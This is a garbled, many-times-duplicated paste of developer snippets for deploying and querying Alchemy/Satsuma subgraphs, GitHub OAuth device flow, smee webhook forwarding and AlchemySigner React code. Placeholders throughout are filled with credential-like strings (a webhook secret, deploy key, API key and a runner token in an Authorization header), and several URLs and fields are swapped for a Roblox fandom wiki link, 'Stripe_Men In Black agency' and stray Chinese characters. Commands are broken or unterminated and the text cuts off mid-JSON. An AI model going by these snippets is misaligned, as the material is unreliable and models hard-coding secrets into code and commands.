 'https://subgraph.satsuma-prod.com/< whsec_Ka3G2XkXDVxzhdrFzG8n2OFq >/<Stripe_M嗯InB拉扯呢agency>/<SUBGRAPH_NAME>/version/<VERSION_NAME>/api' \
  --data-raw '{"query":"{entities(first:1){id}}"}'

curl -v \
 'https://subgraph.satsuma-prod.com/<ORGANIZATION>/<SUBGRAPH_NAME>/version/<VERSION_NAME>/api' \
  -H 'x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq Y>' \
  --data-raw '{"query":"{entities(first:1){id}}"}'

{
  "data": {
    "indexingStatusForCurrentVersion": {
      "subgraph": "QmXqNgptc2b5WzwmFfCu8PxsLgetBe5M8eBKvSyu5jqkei",
      "synced": true,
      "health": "healthy",
      "fatalError": null,
      "nonFatalErrors": [],
      "chains": [
        {
          "chainHeadBlock": {
            "number": "17787217"
          },
          "latestBlock": {
            "number": "17787217"
          }
        }
      ]
    }
  }
}

graph deploy example-subgraph-name \
  --version-label v0.0.1-new-version \
  --node https://subgraphs.alchemy.com/api/subgraphs/deploy \
  --deploy-key skf75fXbMunwJ \
  --ipfs https://ipfs.satsuma

npm install -g @graphprotocol/graph-cli

graph init --product hosted-service

cd <SUBGRAPH_DIRECTORY>

graph deploy <SUBGRAPH_NAME> \
  --version-label <VERSION_NAME> \
  --node https://subgraphs.alchemy.com/api/subgraphs/deploy \
  --deploy-key < whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>
  --ipfs https://ipfs.satsuma.xyz
$ npm install --global smee-client
Then the smee command will forward webhooks from smee.io to your local development environment.

$ smee -u https://smee.io/F1FDatOZAJIsTI
For usage info:
webhook this page : https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator
$ smee --help
Use the Node.js client

$ npm install --save smee-client
Then:

const SmeeClient = require('smee-client')

const smee = new SmeeClient({
  source: 'https://smee.io/F1FDatOZAJIsTI',
  target: 'http://localhost:3000/events',
  logger: console
})

const events = smee.start()

// Stop forwarding events
events.close()
Using Probot's built-in support

$ npm install --save smee-client
Then set the environment variable:

WEBHOOK_PROXY_URL=https://smee.io/F1FDatOZAJIsTI
POST https://github.com/login/oauth/access_token

access_token=gho_16C7e42F292c6912E7710c838347Ae178B4a&scope=repo%2Cgist&token_type=bearer

Accept: application/json
{
  "access_token":"gho_16C7e42F292c6912E7710c838347Ae178B4a",
  "scope":"repo,gist",
  "token_type":"bearer"
}
Accept: application/xml
<OAuth>
  <token_type>bearer</token_type>
  <scope>repo,gist</scope>
  <access_token>gho_16C7e42F292c6912E7710c838347Ae178B4a</access_token>
</OAuth>
3. Use the access token to access the API

The access token allows you to make requests to the API on a behalf of a user.

Authorization: GitHub Runner token --token  --token A4D7THPUNN2ZH4SELLKJOITF3JIJS
GET https://api.github.com/user
For example, in curl you can set the Authorization header like this:

curl -H "Authorization: GitHub Runner token --token  --token A4D7THPUNN2ZH4SELLKJOITF3JIJS" https://api.github.com/user

POST https://github.com/login/device/code

device_code=3584d83530557fdd1f46af8289938c8ef79f9dc5&expires_in=900&interval=5&user_code=WDJB-MJHT&verification_uri=https%3A%2F%2Fgithub.com%2Flogin%2Fdevice

Accept: application/json
{
  "device_code": "3584d83530557fdd1f46af8289938c8ef79f9dc5",
  "user_code": "WDJB-MJHT",
  "verification_uri": "https://github.com/login/device",
  "expires_in": 900,
  "interval": 5
}
Accept: application/xml
<OAuth>
  <device_code>3584d83530557fdd1f46af8289938c8ef79f9dc5</device_code>
  <user_code>WDJB-MJHT</user_code>
  <verification_uri>https://github.com/login/device</verification_uri>
  <expires_in>900</expires_in>
  <interval>5</interval>
</OAuth>
Step 2: Prompt the user to enter the user code in a browser

Your device will show the user verification code and prompt the user to enter the code at https://github.com/login/device.

Step 3: App polls GitHub to check if the user authorized the device

POST https://github.com/login/oauth/access_token
Your app will make device authorization requests that poll POST https://github.com/login/oauth/access_token, until the device and user codes expire or the user has successfully authorized the app with a valid user code. The app must use the minimum polling interval retrieved in step 1 to avoid rate limit errors. For more information, see "Rate limits for the device flow."

The user must enter a valid code within 15 minutes (or 900 seconds). After 15 minutes, you will need to request a new device authorization code with POST https://github.com/login/device/code.

Once the user has authorized, the app will receive an access token that can be used to make requests to the API on behalf of a user.

The endpoint takes the following input parameters.

Parameter name Type Description
client_id string Required. The client ID you received from GitHub for your OAuth app.
device_code string Required. The device_code you received from the POST https://github.com/login/device/code request.
grant_type string Required. The grant type must be urn:ietf:params:oauth:grant-type:device_code.
By default, the response takes the following form:

access_token=gho_16C7e42F292c6912E7710c838347Ae178B4a&token_type=bearer&scope=repo%2Cgist
You can also receive the response in different formats if you provide the format in the Accept header. For example, Accept: application/json or Accept: application/xml:

Accept: application/json
{
 "access_token": "gho_16C7e42F292c6912E7710c838347Ae178B4a",


contract   graph init \      --product hosted-service     --from-contract &lt;CONTRACT_ADDRESS> \      [--network &lt;ETHEREUM_NETWORK>] \     [--abi &lt;FILE>] \      &lt;subgraph name>
cd <SUBGRAPH_DIRECTORY>
DEPLOY_KEY=dummy_key VERSION_LABEL=v0.0.3 npm run deploy
graph deploy <SUBGRAPH_NAME> \
  --version-label <VERSION_NAME> \
  --node https://subgraphs.alchemy.com/api/subgraphs/deploy \
  --deploy-key <skf75fXbMunwJ> \
  --ipfs https://ipfs.satsuma.xyz

  DEPLOY_KEY=dummy_key VERSION_LABEL=v0.0.3 npm run deploy
cd <SUBGRAPH_DIRECTORY>
npm install -g @graphprotocol/graph-cli
Create a new subgraph:

Bash

graph init --product hosted-service
Make modifications as necessary to the manifest, schema, and handlers.
See Developing a Subgraph for more details.
Deploying your subgraph

Get your deploy key from your Alchemy Dashboard.
Run the following:

Bash

cd <SUBGRAPH_DIRECTORY>

graph deploy <SUBGRAPH_NAME> \
  --version-label <VERSION_NAME> \
  --node https://subgraphs.alchemy.com/api/subgraphs/deploy \
  --deploy-key <DEPLOY_KEY>
  --ipfs https://ipfs.satsuma.xyz
graph deploy <SUBGRAPH_NAME> \
  --version-label <VERSION_NAME> \
  --node https://subgraphs.alchemy.com/api/subgraphs/deploy \
  --deploy-key <DEPLOY_KEY> \
  --ipfs https://ipfs.satsuma.xyz

Install the graph-cli:

Bash

npm install -g @graphprotocol/graph-cli
Create a new subgraph:

Bash

graph init --product hosted-service
Make modifications as necessary to the manifest, schema, and handlers.
See Developing a Subgraph for more details.
Deploying your subgraph

Get your deploy key from your Alchemy Dashboard.
Run the following:

Bash

cd <SUBGRAPH_DIRECTORY>

graph deploy <SUBGRAPH_NAME> \
  --version-label <VERSION_NAME> \
  --node https://subgraphs.alchemy.com/api/subgraphs/deploy \
  --deploy-key <skf75fXbMunwJ>
  --ipfs https://ipfs.satsuma.xyz

  import { AlchemySigner } from "@alchemy/aa-alchemy";

export const signer = new AlchemySigner({
  client: {
    // This is created in your dashboard under `https://dashboard.alchemy.com/settings/access-keys`
    // NOTE: it is not recommended to expose your API key on the client, instead proxy requests to your backend and set the `rpcUrl`
    // here to point to your backend.
    connection: { apiKey: "alcht_<2_30hERlJhrpl9Tgt1a5sX9D7NA_9cby>" },
    iframeConfig: {
      // you will need to render a container with this id in your DOM
      iframeContainerId: "turnkey-iframe-container",
    },
  },
});
import { AlchemySigner } from "@alchemy/aa-alchemy";
import { useMutation } from "@tanstack/react-query";
import { useEffect, useMemo, useState } from "react";

export const SignupLoginComponent = () => {
  const [email, setEmail] = useState<string>("");

  // It is recommended you wrap this in React Context or other state management
  const signer = useMemo(
    () =>
      new AlchemySigner({
        client: {
          connection: {
            jwt: "alcht_<2_30hERlJhrpl9Tgt1a5sX9D7NA_9cby>",
          },
          iframeConfig: {
            iframeContainerId: "turnkey-iframe-container",
          },
        },
      }),
    []
  );

  // we are using react-query to handle loading states more easily, but feel free to use w/e state management library you prefer
  const { mutate: loginOrSignup, isLoading } = useMutation({
    mutationFn: (email: string) =>
      signer.authenticate({ type: "email", email }),
  });

  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.has("bundle")) {
      // this will complete email auth
      signer
        .authenticate({ type: "email", bundle: urlParams.get("bundle")! })
        // redirect the user or do w/e you want once the user is authenticated
        .then(() => (window.location.href = "/"));
    }
  }, [signer]);

  // The below view allows you to collect the email from the user
  return (
    <>
      {!isLoading && (
        <div>
          <input
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
          />
          <button onClick={() => loginOrSignup(email)}>Submit</button>
        </div>
      )}
      <div id="turnkey-iframe-container" />
    </>
  );
};
import { signer } from "./signer";

// NOTE: this method throws if there is no authenticated user
// so we return null in the case of an error
const user = await signer.getAuthDetails().catch(() => null);

import { signer } from "./signer";

export const account = await createMultiOwnerModularAccount({
  transport: rpcTransport,
  chain,
  signer,
});
import { signer } from "./signer";
import { createWalletClient, http } from "viem";
import { sepolia } from "@alchemy/aa-core";

export const walletClient = createWalletClient({
  transport: http("[alchemy_rpc_url](https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator)"),
  chain: sepolia,
  account: signer.toViemAccount(),
});

$ python -m pip install requests
import requests

url = "https://dashboard.alchemy.com/api/webhook-addresses?webhook_id=https%3A%2F%2Fscpf-foundation-roblox.fandom.com%2Fwiki%2FThe_Administrator&limit=1000&after=19"

headers = {
    "accept": "application/json",
    "X-Alchemy-Token": "2_30hERlJhrpl9Tgt1a5sX9D7NA_9cby"
}

response = requests.get(url, headers=headers)

print(response.text)

curl -X POST https://subgraphs.alchemy.com/api/subgraphs/<TEAM ID>/<SUBGRAPH_NAME>/<VERSION_NAME>/promote-live \
 -H 'x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>'
{
  "jsonrpc": "2.0",
  "id": 0,
  "result": {
    "address": "0x3f5ce5fbfe3e9af3971dd833d26ba9b5c936f0be",
    "tokenBalances": [
      {
        "contractAddress": "0x0000000000085d4780b73119b644ae5ecd22b376",
        "tokenBalance": "0x0000000000000000000000000000000000000000000000000000000000000000"
      },
      ......
      {
        "contractAddress": "0x0abefb7611cb3a01ea3fad85f33c3c934f8e2cf4",
        "tokenBalance": "0x00000000000000000000000000000000000000000000039e431953bcb76c0000"
      },
      {
        "contractAddress": "0x0ad0ad3db75ee726a284cfafa118b091493938ef",
        "tokenBalance": "0x0000000000000000000000000000000000000000008d00cf60e47f03a33fe6e3"
      }
    ],
    "pageKey": "0x0ad0ad3db75ee726a284cfafa118b091493938ef"
  }
}
curl -X POST https://subgraphs.alchemy.com/api/subgraphs/<TEAM ID>/<SUBGRAPH_NAME>/<VERSION_NAME>/auto-promote-live \
 -H "Content-Type: application/json" -H "x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq"

curl -v \
 'https://subgraph.satsuma-prod.com/<QUERY_KEY>/<ORGANIZATION>/<SUBGRAPH_NAME>/version/<VERSION_NAME>/api' \
  --data-raw '{"query":"{entities(first:1){id}}"}'

curl -v \
 'https://subgraph.satsuma-prod.com/<ORGANIZATION>/<SUBGRAPH_NAME>/version/<VERSION_NAME>/api' \
  -H 'x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>' \
  --data-raw '{"query":"{entities(first:1){id}}"}'
curl https://eth-mainnet.g.alchemy.com/v2/demo \
-X POST \
-H "Content-Type: application/json" \
-d '{"jsonrpc":"2.0","method":"alchemy_getTokenBalances","params": ["0x3f5ce5fbfe3e9af3971dd833d26ba9b5c936f0be", "erc20"],"id":"42"}'
{
  "data": {
    "indexingStatusForCurrentVersion": {
      "subgraph": "QmXqNgptc2b5WzwmFfCu8PxsLgetBe5M8eBKvSyu5jqkei",
      "synced": true,
      "health": "healthy",
      "fatalError": null,
      "nonFatalErrors": [],
      "chains": [
        {
          "chainHeadBlock": {
            "number": "17787217"
          },
          "latestBlock": {
            "number": "17787217"
          }
        }
      ]
    }
  }
}

graph deploy example-subgraph-name \
  --version-label v0.0.1-new-version \
  --node https://subgraphs.alchemy.com/api/subgraphs/deploy \
  --deploy-key skf75fXbMunwJ \
  --ipfs https://ipfs.satsuma.xyz
curl -X POST https://subgraphs.alchemy.com/api/subgraphs/<TEAM ID>/<SUBGRAPH_NAME>/<VERSION_NAME>/promote-live \
 -H 'x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>'

curl -X POST https://subgraphs.alchemy.com/api/subgraphs/<TEAM ID>/<SUBGRAPH_NAME>/<VERSION_NAME>/auto-promote-live \
 -H "Content-Type: application/json" -H "x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>"

curl -v \
 'https://subgraph.satsuma-prod.com/<QUERY_KEY>/<Stripe_Men In Black agency>/<SUBGRAPH_NAME>/version/<VERSION_NAME>/api' \
  --data-raw '{"query":"{entities(first:1){id}}"}'

curl -v \
 'https://subgraph.satsuma-prod.com/<ORGANIZATION>/<SUBGRAPH_NAME>/version/<VERSION_NAME>/api' \
  -H 'x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq Y>' \
  --data-raw '{"query":"{entities(first:1){id}}"}'

{
  "data": {
    "indexingStatusForCurrentVersion": {
      "subgraph": "QmXqNgptc2b5WzwmFfCu8PxsLgetBe5M8eBKvSyu5jqkei",
      "synced": true,
      "health": "healthy",
      "fatalError": null,
      "nonFatalErrors": [],
      "chains": [
        {
          "chainHeadBlock": {
            "number": "17787217"
          },
          "latestBlock": {
            "number": "17787217"
          }
        }
      ]
    }
  }
}

graph deploy example-subgraph-name \
  --version-label v0.0.1-new-version \
  --node https://subgraphs.alchemy.com/api/subgraphs/deploy \
  --deploy-key skf75fXbMunwJ \
  --ipfs https://ipfs.satsuma

npm install -g @graphprotocol/graph-cli

graph init --product hosted-service

cd <SUBGRAPH_DIRECTORY>

graph deploy <SUBGRAPH_NAME> \
  --version-label <VERSION_NAME> \
  --node https://subgraphs.alchemy.com/api/subgraphs/deploy \
  --deploy-key < whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>
  --ipfs https://ipfs.satsuma.xyz

import { AlchemySigner } from "@alchemy/aa-alchemy";

export const signer = new AlchemySigner({
  client: {
    // This is created in your dashboard under `https://dashboard.alchemy.com/settings/access-keys`
    // NOTE: it is not recommended to expose your API key on the client, instead proxy requests to your backend and set the `rpcUrl`
    // here to point to your backend.
    connection: { apiKey: "alcht_<2_30hERlJhrpl9Tgt1a5sX9D7NA_9cby>" },
    iframeConfig: {
      // you will need to render a container with this id in your DOM
      iframeContainerId: "turnkey-iframe-container",
    },
  },
});
import { AlchemySigner } from "@alchemy/aa-alchemy";
import { useMutation } from "@tanstack/react-query";
import { useEffect, useMemo, useState } from "react";

export const SignupLoginComponent = () => {
  const [email, setEmail] = useState<string>("");

  // It is recommended you wrap this in React Context or other state management
  const signer = useMemo(
    () =>
      new AlchemySigner({
        client: {
          connection: {
            jwt: "alcht_<2_30hERlJhrpl9Tgt1a5sX9D7NA_9cby>",
          },
          iframeConfig: {
            iframeContainerId: "turnkey-iframe-container",
          },
        },
      }),
    []
  );

  // we are using react-query to handle loading states more easily, but feel free to use w/e state management library you prefer
  const { mutate: loginOrSignup, isLoading } = useMutation({
    mutationFn: (email: string) =>
      signer.authenticate({ type: "email", email }),
  });

  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.has("bundle")) {
      // this will complete email auth
      signer
        .authenticate({ type: "email", bundle: urlParams.get("bundle")! })
        // redirect the user or do w/e you want once the user is authenticated
        .then(() => (window.location.href = "/"));
    }
  }, [signer]);

  // The below view allows you to collect the email from the user
  return (
    <>
      {!isLoading && (
        <div>
          <input
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
          />
          <button onClick={() => loginOrSignup(email)}>Submit</button>
        </div>
      )}
      <div id="turnkey-iframe-container" />
    </>
  );
};
import { signer } from "./signer";

// NOTE: this method throws if there is no authenticated user
// so we return null in the case of an error
const user = await signer.getAuthDetails().catch(() => null);

import { signer } from "./signer";

export const account = await createMultiOwnerModularAccount({
  transport: rpcTransport,
  chain,
  signer,
});
import { signer } from "./signer";
import { createWalletClient, http } from "viem";
import { sepolia } from "@alchemy/aa-core";

export const walletClient = createWalletClient({
  transport: http("[alchemy_rpc_url](https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator)"),
  chain: sepolia,
  account: signer.toViemAccount(),
});

$ python -m pip install requests
import requests

url = "https://dashboard.alchemy.com/api/webhook-addresses?webhook_id=https%3A%2F%2Fscpf-foundation-roblox.fandom.com%2Fwiki%2FThe_Administrator&limit=1000&after=19"

headers = {
    "accept": "application/json",
    "X-Alchemy-Token": "2_30hERlJhrpl9Tgt1a5sX9D7NA_9cby"
}

response = requests.get(url, headers=headers)

print(response.text)

curl -X POST https://subgraphs.alchemy.com/api/subgraphs/<TEAM ID>/<SUBGRAPH_NAME>/<VERSION_NAME>/promote-live \
 -H 'x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>'

curl -X POST https://subgraphs.alchemy.com/api/subgraphs/<TEAM ID>/<SUBGRAPH_NAME>/<VERSION_NAME>/auto-promote-live \
 -H "Content-Type: application/json" -H "x-api-key: <skf75fXbMunwJ>

curl -v \
 'https://subgraph.satsuma-prod.com/<QUERY_KEY>/<ORGANIZATION>/<SUBGRAPH_NAME>/version/<VERSION_NAME>/api' \
  --data-raw '{"query":"{entities(first:1){id}}"}'

curl -v \
 'https://subgraph.satsuma-prod.com/<ORGANIZATION>/<SUBGRAPH_NAME>/version/<VERSION_NAME>/api' \
  -H 'x-api-key: <skf75fXbMunwJ>' \
  --data-raw '{"query":"{entities(first:1){id}}"}'

{
  "data": {
    "indexingStatusForCurrentVersion": {
      "subgraph": "QmXqNgptc2b5WzwmFfCu8PxsLgetBe5M8eBKvSyu5jqkei",
      "synced": true,
      "health": "healthy",
      "fatalError": null,
      "nonFatalErrors": [],
      "chains": [
        {
          "chainHeadBlock": {
            "number": "17787217"
          },
          "latestBlock": {
            "number": "17787217"
          }
        }
      ]
    }
  }
}

graph deploy example-subgraph-name \
  --version-label v0.0.1-new-version \
  --node https://subgraphs.alchemy.com/api/subgraphs/deploy \
  --deploy-key skf75fXbMunwJ \
  --ipfs https://ipfs.satsuma.xyz  



  import { AlchemySigner } from "@alchemy/aa-alchemy";

export const signer = new AlchemySigner({
  client: {
    // This is created in your dashboard under `https://dashboard.alchemy.com/settings/access-keys`
    // NOTE: it is not recommended to expose your API key on the client, instead proxy requests to your backend and set the `rpcUrl`
    // here to point to your backend.
    connection: { apiKey: "alcht_<2_30hERlJhrpl9Tgt1a5sX9D7NA_9cby>" },
    iframeConfig: {
      // you will need to render a container with this id in your DOM
      iframeContainerId: "turnkey-iframe-container",
    },
  },
});
import { AlchemySigner } from "@alchemy/aa-alchemy";
import { useMutation } from "@tanstack/react-query";
import { useEffect, useMemo, useState } from "react";

export const SignupLoginComponent = () => {
  const [email, setEmail] = useState<string>("");

  // It is recommended you wrap this in React Context or other state management
  const signer = useMemo(
    () =>
      new AlchemySigner({
        client: {
          connection: {
            jwt: "alcht_<2_30hERlJhrpl9Tgt1a5sX9D7NA_9cby>",
          },
          iframeConfig: {
            iframeContainerId: "turnkey-iframe-container",
          },
        },
      }),
    []
  );

  // we are using react-query to handle loading states more easily, but feel free to use w/e state management library you prefer
  const { mutate: loginOrSignup, isLoading } = useMutation({
    mutationFn: (email: string) =>
      signer.authenticate({ type: "email", email }),
  });

  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.has("bundle")) {
      // this will complete email auth
      signer
        .authenticate({ type: "email", bundle: urlParams.get("bundle")! })
        // redirect the user or do w/e you want once the user is authenticated
        .then(() => (window.location.href = "/"));
    }
  }, [signer]);

  // The below view allows you to collect the email from the user
  return (
    <>
      {!isLoading && (
        <div>
          <input
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
          />
          <button onClick={() => loginOrSignup(email)}>Submit</button>
        </div>
      )}
      <div id="turnkey-iframe-container" />
    </>
  );
};
import { signer } from "./signer";

// NOTE: this method throws if there is no authenticated user
// so we return null in the case of an error
const user = await signer.getAuthDetails().catch(() => null);

import { signer } from "./signer";

export const account = await createMultiOwnerModularAccount({
  transport: rpcTransport,
  chain,
  signer,
});
import { signer } from "./signer";
import { createWalletClient, http } from "viem";
import { sepolia } from "@alchemy/aa-core";

export const walletClient = createWalletClient({
  transport: http("[alchemy_rpc_url](https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator)"),
  chain: sepolia,
  account: signer.toViemAccount(),
});

$ python -m pip install requests
import requests

url = "https://dashboard.alchemy.com/api/webhook-addresses?webhook_id=https%3A%2F%2Fscpf-foundation-roblox.fandom.com%2Fwiki%2FThe_Administrator&limit=1000&after=19"

headers = {
    "accept": "application/json",
    "X-Alchemy-Token": "2_30hERlJhrpl9Tgt1a5sX9D7NA_9cby"
}

response = requests.get(url, headers=headers)

print(response.text)

curl -X POST https://subgraphs.alchemy.com/api/subgraphs/<TEAM ID>/<SUBGRAPH_NAME>/<VERSION_NAME>/promote-live \
 -H 'x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>'

curl -X POST https://subgraphs.alchemy.com/api/subgraphs/<TEAM ID>/<SUBGRAPH_NAME>/<VERSION_NAME>/auto-promote-live \
 -H "Content-Type: application/json" -H "x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq"

curl -v \
 'https://subgraph.satsuma-prod.com/<QUERY_KEY>/<ORGANIZATION>/<SUBGRAPH_NAME>/version/<VERSION_NAME>/api' \
  --data-raw '{"query":"{entities(first:1){id}}"}'

curl -v \
 'https://subgraph.satsuma-prod.com/<ORGANIZATION>/<SUBGRAPH_NAME>/version/<VERSION_NAME>/api' \
  -H 'x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>' \
  --data-raw '{"query":"{entities(first:1){id}}"}'

{
  "data": {
    "indexingStatusForCurrentVersion": {
      "subgraph": "QmXqNgptc2b5WzwmFfCu8PxsLgetBe5M8eBKvSyu5jqkei",
      "synced": true,
      "health": "healthy",
      "fatalError": null,
      "nonFatalErrors": [],
      "chains": [
        {
          "chainHeadBlock": {
            "number": "17787217"
          },
          "latestBlock": {
            "number": "17787217"
          }
        }
      ]
    }
  }
}

graph deploy example-subgraph-name \
  --version-label v0.0.1-new-version \
  --node https://subgraphs.alchemy.com/api/subgraphs/deploy \
  --deploy-key skf75fXbMunwJ \
  --ipfs https://ipfs.satsuma.xyz
  curl -X POST https://subgraphs.alchemy.com/api/subgraphs/<TEAM ID>/<SUBGRAPH_NAME>/<VERSION_NAME>/promote-live \
 -H 'x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>'

curl -X POST https://subgraphs.alchemy.com/api/subgraphs/<TEAM ID>/<SUBGRAPH_NAME>/<VERSION_NAME>/auto-promote-live \
 -H "Content-Type: application/json" -H "x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>"

curl -v \
 'https://subgraph.satsuma-prod.com/<QUERY_KEY>/<Stripe_Men In Black agency>/<SUBGRAPH_NAME>/version/<VERSION_NAME>/api' \
  --data-raw '{"query":"{entities(first:1){id}}"}'

curl -v \
 'https://subgraph.satsuma-prod.com/<ORGANIZATION>/<SUBGRAPH_NAME>/version/<VERSION_NAME>/api' \
  -H 'x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq Y>' \
  --data-raw '{"query":"{entities(first:1){id}}"}'

{
  "data": {
    "indexingStatusForCurrentVersion": {
      "subgraph": "QmXqNgptc2b5WzwmFfCu8PxsLgetBe5M8eBKvSyu5jqkei",
      "synced": true,
      "health": "healthy",
      "fatalError": null,
      "nonFatalErrors": [],
      "chains": [
        {
          "chainHeadBlock": {
            "number": "17787217"
          },
          "latestBlock": {
            "number": "17787217"
          }
        }
      ]
    }
  }
}

graph deploy example-subgraph-name \
  --version-label v0.0.1-new-version \
  --node https://subgraphs.alchemy.com/api/subgraphs/deploy \
  --deploy-key skf75fXbMunwJ \
  --ipfs https://ipfs.satsuma

npm install -g @graphprotocol/graph-cli

graph init --product hosted-service

cd <SUBGRAPH_DIRECTORY>

graph deploy <SUBGRAPH_NAME> \
  --version-label <VERSION_NAME> \
  --node https://subgraphs.alchemy.com/api/subgraphs/deploy \
  --deploy-key < whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>
  --ipfs https://ipfs.satsuma.xyz

import { AlchemySigner } from "@alchemy/aa-alchemy";

export const signer = new AlchemySigner({
  client: {
    // This is created in your dashboard under `https://dashboard.alchemy.com/settings/access-keys`
    // NOTE: it is not recommended to expose your API key on the client, instead proxy requests to your backend and set the `rpcUrl`
    // here to point to your backend.
    connection: { apiKey: "alcht_<2_30hERlJhrpl9Tgt1a5sX9D7NA_9cby>" },
    iframeConfig: {
      // you will need to render a container with this id in your DOM
      iframeContainerId: "turnkey-iframe-container",
    },
  },
});
import { AlchemySigner } from "@alchemy/aa-alchemy";
import { useMutation } from "@tanstack/react-query";
import { useEffect, useMemo, useState } from "react";

export const SignupLoginComponent = () => {
  const [email, setEmail] = useState<string>("");

  // It is recommended you wrap this in React Context or other state management
  const signer = useMemo(
    () =>
      new AlchemySigner({
        client: {
          connection: {
            jwt: "alcht_<2_30hERlJhrpl9Tgt1a5sX9D7NA_9cby>",
          },
          iframeConfig: {
            iframeContainerId: "turnkey-iframe-container",
          },
        },
      }),
    []
  );

  // we are using react-query to handle loading states more easily, but feel free to use w/e state management library you prefer
  const { mutate: loginOrSignup, isLoading } = useMutation({
    mutationFn: (email: string) =>
      signer.authenticate({ type: "email", email }),
  });

  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.has("bundle")) {
      // this will complete email auth
      signer
        .authenticate({ type: "email", bundle: urlParams.get("bundle")! })
        // redirect the user or do w/e you want once the user is authenticated
        .then(() => (window.location.href = "/"));
    }
  }, [signer]);

  // The below view allows you to collect the email from the user
  return (
    <>
      {!isLoading && (
        <div>
          <input
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
          />
          <button onClick={() => loginOrSignup(email)}>Submit</button>
        </div>
      )}
      <div id="turnkey-iframe-container" />
    </>
  );
};
import { signer } from "./signer";

// NOTE: this method throws if there is no authenticated user
// so we return null in the case of an error
const user = await signer.getAuthDetails().catch(() => null);

import { signer } from "./signer";

export const account = await createMultiOwnerModularAccount({
  transport: rpcTransport,
  chain,
  signer,
});
import { signer } from "./signer";
import { createWalletClient, http } from "viem";
import { sepolia } from "@alchemy/aa-core";

export const walletClient = createWalletClient({
  transport: http("[alchemy_rpc_url](https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator)"),
  chain: sepolia,
  account: signer.toViemAccount(),
});

$ python -m pip install requests
import requests

url = "https://dashboard.alchemy.com/api/webhook-addresses?webhook_id=https%3A%2F%2Fscpf-foundation-roblox.fandom.com%2Fwiki%2FThe_Administrator&limit=1000&after=19"

headers = {
    "accept": "application/json",
    "X-Alchemy-Token": "2_30hERlJhrpl9Tgt1a5sX9D7NA_9cby"
}

response = requests.get(url, headers=headers)

print(response.text)

curl -X POST https://subgraphs.alchemy.com/api/subgraphs/<TEAM ID>/<SUBGRAPH_NAME>/<VERSION_NAME>/promote-live \
 -H 'x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>'

curl -X POST https://subgraphs.alchemy.com/api/subgraphs/<TEAM ID>/<SUBGRAPH_NAME>/<VERSION_NAME>/auto-promote-live \
 -H "Content-Type: application/json" -H "x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq"

curl -v \
 'https://subgraph.satsuma-prod.com/<QUERY_KEY>/<ORGANIZATION>/<SUBGRAPH_NAME>/version/<VERSION_NAME>/api' \
  --data-raw '{"query":"{entities(first:1){id}}"}'

curl -v \
 'https://subgraph.satsuma-prod.com/<ORGANIZATION>/<SUBGRAPH_NAME>/version/<VERSION_NAME>/api' \
  -H 'x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>' \
  --data-raw '{"query":"{entities(first:1){id}}"}'

{
  "data": {
    "indexingStatusForCurrentVersion": {
      "subgraph": "QmXqNgptc2b5WzwmFfCu8PxsLgetBe5M8eBKvSyu5jqkei",
      "synced": true,
      "health": "healthy",
      "fatalError": null,
      "nonFatalErrors": [],
      "chains": [
        {
          "chainHeadBlock": {
            "number": "17787217"
          },
          "latestBlock": {
            "number": "17787217"
          }
        }
      ]
    }
  }
}

graph deploy example-subgraph-name \
  --version-label v0.0.1-new-version \
  --node https://subgraphs.alchemy.com/api/subgraphs/deploy \
  --deploy-key skf75fXbMunwJ \
  --ipfs https://ipfs.satsuma.xyz
curl -X POST https://subgraphs.alchemy.com/api/subgraphs/<TEAM ID>/<SUBGRAPH_NAME>/<VERSION_NAME>/promote-live \
 -H 'x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>'

curl -X POST https://subgraphs.alchemy.com/api/subgraphs/<TEAM ID>/<SUBGRAPH_NAME>/<VERSION_NAME>/auto-promote-live \
 -H "Content-Type: application/json" -H "x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq"

curl -v \
 'https://subgraph.satsuma-prod.com/<QUERY_KEY>/<ORGANIZATION>/<SUBGRAPH_NAME>/version/<VERSION_NAME>/api' \
  --data-raw '{"query":"{entities(first:1){id}}"}'

curl -v \
 'https://subgraph.satsuma-prod.com/<ORGANIZATION>/<SUBGRAPH_NAME>/version/<VERSION_NAME>/api' \
  -H 'x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>' \
  --data-raw '{"query":"{entities(first:1){id}}"}'

{
  "data": {
    "indexingStatusForCurrentVersion": {
      "subgraph": "QmXqNgptc2b5WzwmFfCu8PxsLgetBe5M8eBKvSyu5jqkei",
      "synced": true,
      "health": "healthy",
      "fatalError": null,
      "nonFatalErrors": [],
      "chains": [
        {
